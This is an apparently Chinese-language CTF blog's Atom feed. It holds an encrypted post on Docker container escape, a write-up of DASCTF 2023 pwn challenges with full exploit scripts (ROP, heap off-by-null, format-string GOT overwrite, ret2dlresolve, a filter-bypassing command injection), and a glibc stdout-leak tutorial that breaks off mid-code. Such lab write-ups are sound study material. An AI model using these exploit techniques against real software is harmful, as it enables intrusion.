<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>翰青HanQi&#39;s Blog</title>
  
  <subtitle>北极落小雪</subtitle>
  <link href="https://jamorant12138.github.io/atom.xml" rel="self"/>
  
  <link href="https://jamorant12138.github.io/"/>
  <updated>2023-09-19T13:08:39.286Z</updated>
  <id>https://jamorant12138.github.io/</id>
  
  <author>
    <name>翰青HanQi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://jamorant12138.github.io/2023/09/18/yi-chong-tong-sha-docker-suo-you-ban-ben-de-xin-rong-qi-tao-yi-shou-fa/"/>
    <id>https://jamorant12138.github.io/2023/09/18/yi-chong-tong-sha-docker-suo-you-ban-ben-de-xin-rong-qi-tao-yi-shou-fa/</id>
    <published>2023-09-18T15:40:09.000Z</published>
    <updated>2023-09-19T13:08:39.286Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d832cc3e75b738e4626540a920d657854de1425239b132cff78d6083d47e53b9">524483ba78554d2f52052f509f794fd9e2927dcfb3d38089316f9034be1d3fe7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">一种通杀Docker所有版本的(新)容器逃逸手法</summary>
    
    
    
    <category term="容器逃逸" scheme="https://jamorant12138.github.io/categories/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>DASCTF 2023六月挑战赛｜二进制专项 复现</title>
    <link href="https://jamorant12138.github.io/2023/07/20/dasctf-2023-liu-yue-tiao-zhan-sai-er-jin-zhi-zhuan-xiang-fu-xian/"/>
    <id>https://jamorant12138.github.io/2023/07/20/dasctf-2023-liu-yue-tiao-zhan-sai-er-jin-zhi-zhuan-xiang-fu-xian/</id>
    <published>2023-07-20T15:40:09.000Z</published>
    <updated>2023-07-30T02:39:30.357Z</updated>
    
    <content type="html"><![CDATA[<p>(<del>距上一次好好看题应该有两个月了吧….</del></p><h2 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>第一次看多线程的题.没开pie和canary.<br>主线程在开启一个子线程后开启沙盒只能使用read,write调用,然后是一个0x10字节的溢出.<br>子线程是一个write的无限循环.</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主线程禁掉了open,所以无法进行orw.由于子线程是在主线程开启沙箱前创建的,不受沙箱影响.所以最终是要在子线程中执行system.<br>要通过主线程的溢出劫持子线程的控制流,可以通过线程间共享的got表.将write的got表改为主线程中溢出的地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307161610872.png"></p><p>由于新线程的栈是mmap得到的,所以可以利用其与libc的固定偏移得到.在子线程上再进行栈迁移+rop.<br>(感觉这题的各种偏移巧妙得诡异)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python">magic_read <span class="token operator">=</span> <span class="token number">0x4013AE</span>bss <span class="token operator">=</span> <span class="token number">0x404200</span>rdi <span class="token operator">=</span> <span class="token number">0x401483</span>rsi_r15 <span class="token operator">=</span> <span class="token number">0x401481</span> ret <span class="token operator">=</span> <span class="token number">0x4013c6</span>leave_ret <span class="token operator">=</span> <span class="token number">0x4013c5</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token triple-quoted-string string">'''set scheduler-locking oncb *0x4013AEthread 2c'''</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#主线程劫持子线程控制流</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_r15<span class="token punctuation">,</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'sleep'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>bss<span class="token number">-8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#子线程栈迁移+rop</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>thread_stack <span class="token operator">=</span> libc_base<span class="token number">-0x41f0</span>rdi_rbp <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x2a745</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi_rbp<span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>thread_stack<span class="token number">-8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Noka"><a href="#Noka" class="headerlink" title="Noka"></a>Noka</h2><p>任意地址读写没啥好说的.<br>学到一个trick就是改malloc的got表为一个可控返回值(read_num之类)的函数,再加上之后的read可以达成任意地址写.</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>验证身份,由于snprintf限制了长度0x20,可以将%s后面的.key顶出0x20外截断.</p><pre class=" language-python"><code class="language-python">io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'admin :'</span><span class="token punctuation">,</span>b<span class="token string">'..///////////////////flag'</span><span class="token punctuation">)</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180900152.png"><br>然后是一个有过滤的命令拼接.<br>命令之间用’\n’截断,过滤了空格用’\t’分隔参数.<br>注意闭合%s前面的单引号.<br>由于长度限制最后flag用通配符.<br>缓冲区未初始化,所以可以多次写入\n.<br>最后命令是这样的: ‘\ncat\tfl*\n.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180911843.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180904864.png"></p><p>由于缓冲区未初始化,也可以在验证函数的栈帧里布置来绕开过滤.</p><h2 id="Approoooooooaching"><a href="#Approoooooooaching" class="headerlink" title="Approoooooooaching"></a>Approoooooooaching</h2><p>Brainfuck的VM(<del>其实到现在对VM的概念都很模糊</del>).<br>洞在执行的时候对v3没有下界检查,可以直接越界修改返回地址,partial overwrite到后门函数.</p><p>(下次一定记得先找后门,还有就是逆向时看个大概就行了,老是想着把每条语句都看懂…)</p><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>2.27的offbynull,没有输出函数,限制free和malloc次数.有一点特殊的是null会写在chunk[size]的地方,也就是只与size有关而与输入长度无关,这也是之后能部分覆写unsortedbin的fd的原因.</p><p>常规流程了,我的布置用完了free的次数所以打malloc_hook</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>og <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># offbynull构造堆块重叠,部分覆写unsortedbin</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x4c0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    add<span class="token punctuation">(</span><span class="token number">0x2f</span><span class="token punctuation">,</span>b<span class="token string">'\x60\x07'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    <span class="token comment" spellcheck="true"># 泄露地址</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"7e3"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            stdout <span class="token operator">=</span> addr<span class="token number">-131</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'1.'</span><span class="token punctuation">)</span>    leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>malloc_hook_addr<span class="token number">-0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io,</span><span class="token triple-quoted-string string">'''    # breakrva 0xDA4    # '''</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>binary<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span></code></pre><h2 id="Candy-Shop"><a href="#Candy-Shop" class="headerlink" title="Candy_Shop"></a>Candy_Shop</h2><p>两次参数长度8字节的格式化字符串,一次数组越界bss段之前任意写.<br>先泄露地址,改printf的got表为system,完事.</p><pre class=" language-python"><code class="language-python">io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option:'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'%31$p'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'gift:'</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option:'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'bye:'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'in?'</span><span class="token punctuation">,</span><span class="token string">'-10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>2.23堆溢出,没啥特别的</p><h2 id="fooooood"><a href="#fooooood" class="headerlink" title="fooooood"></a>fooooood</h2><p>bss段格式化字符串,改返回地址和参数就行了<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307211003955.png"><br>(这题不能改printf的got表因为不能一次性改完,下一次执行printf的时候会崩)</p><h2 id="matchmaking-platform"><a href="#matchmaking-platform" class="headerlink" title="matchmaking platform"></a>matchmaking platform</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞点在sub_12B7函数,该函数向a1指向空间最多读取128字节(向buf读入了129次),进入最后一次循环时,v3==127,++v3溢出到-0x80,即向a1-0x80地址写一个字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292212184.png"><br>程序的主逻辑,配合上该漏洞,可以在times为4,2时修改byte_4140-0x80位置的pptr的低字节,使*pptr的新值为另一个地址,进而在times为3,1的时候在该地址进行写入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292223923.png"><br>于是寻找0x4000-0x4100内的指针,有GOT表和bss段的IO指针.</p><p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p><p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">+</span>b<span class="token string">'\x80'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'\xb0\x5d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"0x56"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pie_base <span class="token operator">=</span> addr<span class="token number">-0x40a0</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pie_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> b<span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">0x77</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true">#0x77是free字符串在strtab中的偏移</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'\x08'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io,</span><span class="token triple-quoted-string string">'''    # b *$rebase(0x1338)    # '''</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>binary<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><p>(剩余题目之后单独放)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(&lt;del&gt;距上一次好好看题应该有两个月了吧….&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&quot;Dream&quot;&gt;&lt;a href=&quot;#Dream&quot; class=&quot;headerlink&quot; title=&quot;Dream&quot;&gt;&lt;/a&gt;Dream&lt;/h2&gt;&lt;h3 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆</summary>
      
    
    
    
    <category term="ctf复现" scheme="https://jamorant12138.github.io/categories/ctf%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>IO任意地址读写</title>
    <link href="https://jamorant12138.github.io/2023/03/03/io-ren-yi-di-zhi-du-xie/"/>
    <id>https://jamorant12138.github.io/2023/03/03/io-ren-yi-di-zhi-du-xie/</id>
    <published>2023-03-03T15:40:09.000Z</published>
    <updated>2023-03-03T08:38:45.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stdout任意地址读"><a href="#stdout任意地址读" class="headerlink" title="stdout任意地址读"></a>stdout任意地址读</h2><ol><li>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，一般覆盖_IO_write_base的最低字节为\x00,改flag为0xfbad1800(0xfbad1887).通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址.</li><li>修改_IO_2_1_stdout_的_IO_write_base和_IO_read_end使其相等,在puts函数时泄露libc地址.<br>相关源码如下:</li></ol><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span><span class="token punctuation">{</span>  _IO_size_t count<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">/* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */</span>    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      _IO_off64_t new_pos    <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token 